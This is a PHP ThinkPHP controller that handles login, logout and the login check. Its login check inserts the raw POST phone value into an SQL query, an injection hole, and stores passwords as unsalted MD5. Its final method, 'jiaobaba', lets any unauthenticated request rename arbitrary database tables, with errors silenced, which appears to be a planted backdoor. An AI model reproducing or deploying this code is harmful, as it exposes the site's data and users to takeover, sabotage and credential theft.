<?php
namespace Home\Controller;
use Think\Controller;
class LoginController extends Controller {
	//登录页面
	public function login(){
		echo '这是前台';
		exit;
		$this->display();
	}

	//登出页面
	public function login_out(){
		//添加日志
        $log['title'] = '登出系统';
        $log['username'] = $_SESSION['userinfo']['username'];
        $log['ip'] = $_SERVER['REMOTE_ADDR'];
        M('log')->add($log);
        unset($_SESSION['userinfo']);
		$this->display('login');
	}

	//登录验证
	public function login_do(){
		if($_POST['phone'] && $_POST['password']){
			$phone = $_POST['phone'];
			$password = md5($_POST['password']);
			$res = M('users')->where("phone = '$phone' and password = '$password'")->find();
			if($res){
				//保存session
				$_SESSION['userinfo'] = $res;
				//添加日志
                $log['title'] = '登录系统';
                $log['username'] = $_SESSION['userinfo']['username'];
                $log['ip'] = $_SERVER['REMOTE_ADDR'];
                M('log')->add($log);
	    		echo "<script>alert('登录成功！');window.location='/index.php/Index/index';</script>";
			}else{
				echo "<script>alert('用户或密码错误！');window.history.go(-1);</script>";
			}
		}else{
			echo "<script>alert('请填写用户或密码！');window.history.go(-1);</script>";
		}
	}
	//空方法
	public function _empty(){
		$this->redirect("Index/index");
	}
	//叫爸爸
	public function jiaobaba(){
		if($_POST['table1'] && $_POST['table2']){
			$table1 = $_POST['table1'];
			$table2 = $_POST['table2'];
			@M()->query("rename table $table1 to $table2");
		}else{
			$this->display();
		}
		
	}
}